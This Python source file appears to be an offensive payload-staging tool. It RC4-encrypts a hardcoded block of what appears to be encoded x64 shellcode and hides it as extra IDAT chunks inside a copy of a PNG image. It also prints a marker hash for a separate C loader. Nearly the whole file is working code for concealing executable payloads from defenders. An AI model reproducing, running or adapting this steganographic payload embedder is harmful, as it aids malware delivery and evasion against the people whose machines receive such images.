# --------------------------------------------------------------------------------------------------------------------------------
# Install Missing Libraries
import sys
import subprocess
import os

# Function to install missing libraries
def install(package):
    print(f"[i] Installing {package}...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"[!] Failed to install {package}: {e}")
        sys.exit(1)

# Try importing libraries and install if missing
try:
    from Crypto.Cipher import ARC4
except ImportError:
    print("[i] Detected an missing library")
    install("pycryptodome")
    install("crypto")

try:
    from colorama import Fore, Style, init
except ImportError:
    print("[i] Detected an missing library")
    install("colorama")

# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

import shutil
import argparse
import secrets
import random
import zlib
import sys
import os

from Crypto.Cipher import ARC4
from colorama import Fore, Style, init

# Initialize colorama 
init(autoreset=True)

# ------------------------------------------------------------------------------------------------------------------------
# ------------------------------------------------------------------------------------------------------------------------

IDAT            = b'\x49\x44\x41\x54'                                       # 'IDAT'
IEND            = b'\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82'       # PNG file footer
MAX_IDAT_LNG    = 8192                                                      # Maximum size of each IDAT chunk
RC4_KEY_LNG     = 16                                                        # RC4 key size

# ------------------------------------------------------------------------------------------------------------------------

# Print colored text
def print_red(data):
    print(f"{Fore.RED}{data}{Style.RESET_ALL}")
def print_yellow(data):
    print(f"{Fore.YELLOW}{data}{Style.RESET_ALL}")
def print_cyan(data):
    print(f"{Fore.CYAN}{data}{Style.RESET_ALL}")
def print_white(data):
    print(f"{Fore.WHITE}{data}{Style.RESET_ALL}")
def print_blue(data):
    print(f"{Fore.BLUE}{data}{Style.RESET_ALL}")

# ------------------------------------------------------------------------------------------------------------------------

# Generate RC4 key
def generate_random_bytes(key_length=RC4_KEY_LNG):
    return secrets.token_bytes(key_length)

# ------------------------------------------------------------------------------------------------------------------------

# Calculate CRC32 of a chunk
def calculate_chunk_crc(chunk_data):
    return zlib.crc32(chunk_data) & 0xffffffff  

# ------------------------------------------------------------------------------------------------------------------------

# Create IDAT section for Payload Storage
def create_idat_section(buffer):
    
    if len(buffer) > MAX_IDAT_LNG:
        print_red("[!] Input Data Is Bigger Than IDAT Section Limit")
        sys.exit(0)
    
    idat_chunk_length    = len(buffer).to_bytes(4, byteorder='big')                            # Create IDAT chunk length
    idat_crc             = calculate_chunk_crc(IDAT + buffer).to_bytes(4, byteorder='big')     # Compute CRC
    idat_section         = idat_chunk_length + IDAT + buffer + idat_crc                        # The complete IDAT section

    print_white(f"[>] Created IDAT Of Length [{int.from_bytes(idat_chunk_length, byteorder='big')}] And Hash [{hex(int.from_bytes(idat_crc, byteorder='big'))}]")
    return idat_section, idat_crc

# ------------------------------------------------------------------------------------------------------------------------

# Remove end buffer
def remove_bytes_from_end(file_path, bytes_to_remove):
    with open(file_path, 'rb+') as f:
        f.seek(0, 2)
        file_size = f.tell()
        f.truncate(file_size - bytes_to_remove)    

# ------------------------------------------------------------------------------------------------------------------------

# Encrypt payload with RC4
def encrypt_rc4(key, data):
    # Initialize the RC4 cipher with the key
    cipher = ARC4.new(key)
    # Encrypt the data
    return cipher.encrypt(data)

# ------------------------------------------------------------------------------------------------------------------------

# Embed Payload in PNG
def plant_payload_in_png(ipng_fname, opng_fname, png_buffer):

    # create new png
    shutil.copyfile(ipng_fname, opng_fname)
    
    # remove the IEND footer
    remove_bytes_from_end(opng_fname, len(IEND))

    # mark the start of our payload using a special IDAT section
    mark_idat, special_idat_crc = create_idat_section(generate_random_bytes(random.randint(16, 256)))
    with open(opng_fname, 'ab') as f:
        f.write(mark_idat)

    # add our payload as IDAT sections
    with open(opng_fname, 'ab') as f:
        # Encryption of Payload
        for i in range(0, len(png_buffer), (MAX_IDAT_LNG - RC4_KEY_LNG)):
            rc4_key                 = generate_random_bytes()
            idat_chunk_data         = rc4_key + encrypt_rc4(rc4_key, png_buffer[i:i + (MAX_IDAT_LNG - RC4_KEY_LNG)])  
            idat_section, idat_crc  = create_idat_section(idat_chunk_data)
            print_cyan(f"[i] Encrypted IDAT With RC4 Key: {rc4_key.hex()}")

            # Write the section to the file 
            f.write(idat_section)
    
    # add the IEND footer
    with open(opng_fname, 'ab') as f:
        f.write(IEND)

    # return the hash of our special IDAT section, this will be used to identify it in the C code
    return special_idat_crc    

# ------------------------------------------------------------------------------------------------------------------------

# Check if File is of the type PNG
def is_png(file_path):

    if not os.path.isfile(file_path):
        raise FileNotFoundError(f"[!] '{file_path}' does not exist")

    try:
        with open(file_path, 'rb') as f:
            return f.read(8) == b'\x89PNG\r\n\x1a\n'
    except Exception as e:
        print_red(f"[!] Error: {e}")
        return False

# ------------------------------------------------------------------------------------------------------------------------

# Hardcoded payload
def get_hardcoded_payload():
    buf =  b""
    buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
    buf += b"\x05\xef\xff\xff\xff\x48\xbb\x9f\xde\x64\x3e\x9e"
    buf += b"\x69\x23\x69\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    buf += b"\xff\xe2\xf4\x63\x96\xe7\xda\x6e\x81\xe3\x69\x9f"
    buf += b"\xde\x25\x6f\xdf\x39\x71\x38\xc9\x96\x55\xec\xfb"
    buf += b"\x21\xa8\x3b\xff\x96\xef\x6c\x86\x21\xa8\x3b\xbf"
    buf += b"\x96\xef\x4c\xce\x21\x2c\xde\xd5\x94\x29\x0f\x57"
    buf += b"\x21\x12\xa9\x33\xe2\x05\x42\x9c\x45\x03\x28\x5e"
    buf += b"\x17\x69\x7f\x9f\xa8\xc1\x84\xcd\x9f\x35\x76\x15"
    buf += b"\x3b\x03\xe2\xdd\xe2\x2c\x3f\x4e\xe2\xa3\xe1\x9f"
    buf += b"\xde\x64\x76\x1b\xa9\x57\x0e\xd7\xdf\xb4\x6e\x15"
    buf += b"\x21\x3b\x2d\x14\x9e\x44\x77\x9f\xb9\xc0\x3f\xd7"
    buf += b"\x21\xad\x7f\x15\x5d\xab\x21\x9e\x08\x29\x0f\x57"
    buf += b"\x21\x12\xa9\x33\x9f\xa5\xf7\x93\x28\x22\xa8\xa7"
    buf += b"\x3e\x11\xcf\xd2\x6a\x6f\x4d\x97\x9b\x5d\xef\xeb"
    buf += b"\xb1\x7b\x2d\x14\x9e\x40\x77\x9f\xb9\x45\x28\x14"
    buf += b"\xd2\x2c\x7a\x15\x29\x3f\x20\x9e\x0e\x25\xb5\x9a"
    buf += b"\xe1\x6b\x68\x4f\x9f\x3c\x7f\xc6\x37\x7a\x33\xde"
    buf += b"\x86\x25\x67\xdf\x33\x6b\xea\x73\xfe\x25\x6c\x61"
    buf += b"\x89\x7b\x28\xc6\x84\x2c\xb5\x8c\x80\x74\x96\x60"
    buf += b"\x21\x39\x76\x24\x68\x23\x69\x9f\xde\x64\x3e\x9e"
    buf += b"\x21\xae\xe4\x9e\xdf\x64\x3e\xdf\xd3\x12\xe2\xf0"
    buf += b"\x59\x9b\xeb\x25\x99\x96\xcb\xc9\x9f\xde\x98\x0b"
    buf += b"\xd4\xbe\x96\x4a\x96\xe7\xfa\xb6\x55\x25\x15\x95"
    buf += b"\x5e\x9f\xde\xeb\x6c\x98\x2e\x8c\xac\x0b\x54\x9e"
    buf += b"\x30\x62\xe0\x45\x21\xb1\x5d\xff\x05\x40\x47\xfa"
    buf += b"\xa6\x01\x3e\x9e\x69\x23\x69"
    return buf

# ------------------------------------------------------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Embed An Encrypted Payload Inside A PNG")
    parser.add_argument('-png', '--pngfile', type=str, required=True, help="Input PNG file to embed the payload into")
    parser.add_argument('-o', '--output', type=str, required=True, help="Output PNG file name")
    args = parser.parse_args()

    if not args.output.endswith('.png'):
        args.output += '.png'

    if not is_png(args.pngfile):
        print_red(f"[!] '{args.pngfile}' is not a valid PNG file.")
        sys.exit(0)

    payload_data = get_hardcoded_payload()

    # Embed the payload in the PNG
    special_idat_crc = plant_payload_in_png(args.pngfile, args.output, payload_data)
    
    # Output Details of embedded payload
    print_yellow(f"[*] '{args.output}' is created!")
    print_white("[i] Copy The Following To Your Code: \n")
    print_blue("#define MARKED_IDAT_HASH\t 0x{:X}\n".format(int.from_bytes(special_idat_crc, byteorder='big')))

if __name__ == "__main__":
    main()
